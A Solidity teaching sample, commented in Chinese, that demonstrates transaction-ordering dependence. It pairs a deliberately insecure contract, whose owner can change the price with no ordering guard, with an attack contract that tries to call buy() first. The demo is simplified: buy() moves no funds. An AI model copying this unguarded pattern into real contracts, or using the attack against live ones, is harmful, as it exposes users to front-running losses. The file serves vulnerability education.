// Solidity version >=0.8.0 is used here; note that this vulnerability is independent of the Solidity version.
// 漏洞名稱: Transfer Pre-Condition Dependent on Transaction Order
// 描述: 在此漏洞中，交易執行的先後順序會影響到轉移動作前置條件的檢查，可能導致某些交易無法執行或執行狀態不符預期。

pragma solidity >=0.8.0;

// 漏洞合約，存在交易排序依賴問題，因為狀態變數 price 在買入時未受到額外的 ordering 檢查保護。
contract VulnerableTransactionOrdering {
    // 狀態變數：
    // price: 產品的價格，易受交易排序影響
    // owner: 合約擁有者
    uint256 public price;
    address public owner;

    // 事件宣告
    event Purchase(address indexed buyer, uint256 price);
    event PriceChange(address indexed owner, uint256 price);

    // 建構式
    constructor() {
        owner = msg.sender;
        price = 100;
    }

    // 修飾器：僅限 owner 呼叫
    modifier ownerOnly() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // buy 函式，容易受到交易排序影響
    // 問題：當 owner 同時呼叫 setPrice 更新價格時，買家呼叫 buy 得到的 price 可能就不是預期中的數值
    function buy() public returns (uint256) {
        // 漏洞重點：此處直接使用當前 price，未檢查交易順序依賴性前置條件
        emit Purchase(msg.sender, price);
        return price;
    }

    // setPrice 函式，由 owner 呼叫更改價格
    // 漏洞重點：直接修改 price 而不使用額外的 ordering 檢查機制
    function setPrice(uint256 _price) public ownerOnly {
        price = _price;
        emit PriceChange(owner, price);
    }
}

// 攻擊合約用以展示如何利用交易排序問題進行攻擊
// 攻擊情境: 攻擊者發現 owner 在更改價格（setPrice）與買入（buy）之間存在交易排序競爭，
//          攻擊者試圖在 owner 更新價格前先呼叫 buy，以取得較低價格的產品。
contract AttackVulnerable {
    VulnerableTransactionOrdering public target;

    // 部署時指定目標漏洞合約地址
    constructor(address _target) {
        target = VulnerableTransactionOrdering(_target);
    }

    // executeAttack 示範攻擊流程
    // 注意: 此攻擊案例假設 owner 與攻擊者的交易可能在同一區塊內，且因交易排序導致買入時 price 為舊值
    function executeAttack() public {
        // 攻擊者呼叫 buy()
        // 此步驟若被打包在 owner 的 setPrice 之前，將以原本較低價格購買；
        // 若交易排序不同則可能導致不同結果，展示出交易排序依賴的問題。
        target.buy();
    }
}

/* 部署與攻擊步驟說明:
   1. 部署 VulnerableTransactionOrdering 合約。
   2. 部署 AttackVulnerable 合約，並傳入 VulnerableTransactionOrdering 合約的地址作為目標。
   3. 當 owner 同時送出一筆 setPrice 提高價格的交易，攻擊者可呼叫 executeAttack 以期在 setPrice 之前執行 buy。
   4. 若交易排序讓攻擊者的交易先執行，則攻擊者將以舊價格購買，否則可能失敗或以新價格購買。
*/